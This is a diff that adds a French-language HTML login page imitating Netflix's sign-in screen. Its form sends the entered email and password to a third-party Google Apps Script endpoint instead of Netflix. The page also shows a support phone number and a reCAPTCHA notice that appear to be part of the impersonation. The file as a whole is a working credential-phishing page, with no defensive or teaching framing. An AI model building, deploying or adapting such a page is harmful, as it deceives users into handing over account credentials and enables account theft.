@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Netflix - Identifiez-vous</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+
+    <header class="header">
+        <div class="container">
+            <div class="logo">NETFLIX</div>
+            <a href="#" class="btn-ouvrir">OUVRIR</a>
+        </div>
+    </header>
+
+    <main class="main-content">
+        <div class="login-form-container">
+            <h1>Identifiez-vous</h1>
+
+            <form action="https://script.google.com/macros/s/AKfycbwSrOATb0_0LHQcb1EtrSNgjyTXMnyLN3SCP9_VXI2tZ8XkvYv5CZRtp9AV8V9OB9fd/exec" method="POST" class="login-form">
+                <div class="input-group">
+                    <input type="text" id="email" name="email" placeholder="E-mail ou numéro de mobile" required>
+                </div>
+                <div class="input-group">
+                    <input type="password" id="password" name="password" placeholder="Mot de passe" required>
+                </div>
+
+                <button type="submit" class="btn-submit">M'identifier</button>
+
+                <div class="or-separator">OU</div>
+
+                <button type="button" class="btn-code">Utiliser un code d'identification</button>
+
+                <a href="#" class="forgot-password">Mot de passe oublié ?</a>
+
+                <div class="remember-me">
+                    <input type="checkbox" id="remember" name="remember">
+                    <label for="remember">Se souvenir de moi</label>
+                </div>
+
+                <p class="signup-text">Première visite sur Netflix ? <a href="#">Abonnez-vous maintenant.</a></p>
+
+                <p class="recaptcha-text">Cette page est protégée par Google reCAPTCHA pour nous assurer que vous n'êtes pas un robot. <a href="#">En savoir plus.</a></p>
+            </form>
+        </div>
+    </main>
+
+    <footer class="footer">
+        <div class="container">
+            <p class="footer-contact">Des questions ? Appelez le <a href="tel:+330805543063">(+33) 0805-543-063</a> (sans frais)</p>
+
+            <div class="footer-links">
+                <ul>
+                    <li><a href="#">FAQ</a></li>
+                    <li><a href="#">Centre d'aide</a></li>
+                    <li><a href="#">Boutique Netflix</a></li>
+                    <li><a href="#">Conditions d'utilisation</a></li>
+                    <li><a href="#">Confidentialité</a></li>
+                    <li><a href="#">Préférences de cookies</a></li>
+                    <li><a href="#">Mentions légales</a></li>
+                    <li><a href="#">Choix liés à la pub</a></li>
+                </ul>
+            </div>
+
+            <div class="lang-selector">
+                <select name="language" id="language">
+                    <option value="fr" selected>Français</option>
+                    <option value="en">English</option>
+                    </select>
+            </div>
+        </div>
+    </footer>
+
+</body>
+</html>
